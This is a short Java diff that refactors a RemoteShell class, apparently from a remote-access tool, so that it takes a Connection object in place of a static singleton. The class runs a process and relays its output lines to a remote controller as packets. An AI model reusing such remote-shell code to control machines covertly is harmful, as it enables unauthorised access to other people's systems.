@@ -10,6 +10,12 @@ import com.redpois0n.oslib.Shell;
 public class RemoteShell extends Thread {
 
 	private static Process p;
+	
+	private Connection con;
+	
+	public RemoteShell(Connection con) {
+		this.con = con;
+	}
 
 	public void run() {
 		String line;
@@ -24,13 +30,13 @@ public class RemoteShell extends Thread {
 			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
 			while ((line = input.readLine()) != null) {
 				if (!line.trim().equals("")) {
-					Connection.instance.addToSendQueue(new Packet21RemoteShell(line));
+					con.addToSendQueue(new Packet21RemoteShell(line));
 				}
 			}
 			input.close();
 		} catch (Exception ex) {
 			ex.printStackTrace();
-			Connection.instance.addToSendQueue(new Packet21RemoteShell("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
+			con.addToSendQueue(new Packet21RemoteShell("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
 		}
 	}
 	
